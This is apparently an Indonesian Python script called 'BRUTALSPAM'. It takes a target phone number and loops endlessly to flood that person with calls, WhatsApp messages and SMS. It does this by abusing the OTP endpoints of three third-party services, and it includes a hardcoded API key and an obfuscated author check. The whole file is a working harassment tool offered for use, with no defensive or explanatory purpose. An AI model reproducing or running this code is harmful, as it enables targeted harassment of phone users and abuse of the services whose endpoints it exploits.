# --- [ INFORMASI PEMBUAT ] --- #
versi = "Um9jaG1hdCBCYXN1a2k="
author = "Rochmat Basuki"
facebook = "facebook.com/ROZHBASXYZ"
github = "github.com/RozhBasXYZ"

# --- [ IMPORT MODULE ] --- #
import requests, re, time, os, random, base64, sys
import argparse

parser = argparse.ArgumentParser()

parser.add_argument ("-t", help= "Input nomor target", type=str, dest='target', required=True )
parser.add_argument ("-m", help= "Input mode", type=str, dest='mode', required=True )

args = parser.parse_args()

from random import randint as rr
from random import choice as rc
ses = requests.Session()
no = 0

# --- [ CLEAR TERMINAL ] --- #
try: os.system("git pull")
except: pass
if sys.platform.lower() == "win": os.system("cls")
else: os.system("clear")

# --- [ UNTUK DELAY ] --- #
def waktu(min, sc):
    total_second = min * 60 + sc
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r[*] delay 00:{mins:02d}:{secs:02d} detik', end='')
        time.sleep(1)
        total_second -= 1

# --- [ UNTUM SPAM CALL ] --- #
def spam_call(nomor):
	global no
	try:
		date = {"number": nomor,"country_code":"+62","type":"CITCALL"}
		ses.headers.update({"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send", data=date).json()
		if "True" in str(post): no += 1; print(f"[{no}] sukses spam call")
		else: print("[*] terkena limit call")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM WA ] --- #	
def spam_wa(nomor):
	global no
	try:
		date = {"accountType":"customers","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber": nomor}
		ses.headers.update({ "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://www.pinhome.id/api/pinaccount/request/otp", data=date).text
		if "Code" in str(post): no += 1; print(f"[{no}] sukses spam wa")
		else: print("\r[*] terkena limit wa")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM SMS ] --- #
def spam_sms(nomor):
	global no
	try:
		# Spam Sms 1 By Ipot Id
		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
		if "ok" in post: no += 1; print(f"\r[{no}] sukses spam sms      ")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass
	
def menu_utama():
	print(" - BRUTALSPAM -")
	afakah = args.mode
	nomor = args.target
	if afakah in ["call"]:
		print("[!] spam call max 5X sehari per device"); print('-'*15)
		while True: spam_call(nomor); waktu(00, 60)
	elif afakah in ["wa"]:
		print("[!] spam wa unlimited delay auto 30 detik"); print('-'*15)
		while True: spam_wa(nomor) ;waktu(00, 30)
	elif afakah in ["sms"]:
		print("[!] spam sms unlimited tanpa batas"); print('-'*15)
		while True: spam_sms(nomor); waktu(00, 5)
	elif afakah in ["brutal"]:
		print("[!] 1 wa, 1 call dan 30 sms tanpa delay per 30 detik"); print('-'*15)
		while True:
			spam_call(nomor); spam_wa(nomor)
			for x in range(15): spam_sms(nomor)
	else: exit("[*] apa woyy")
	
if __name__ == "__main__":
	menu_utama()
	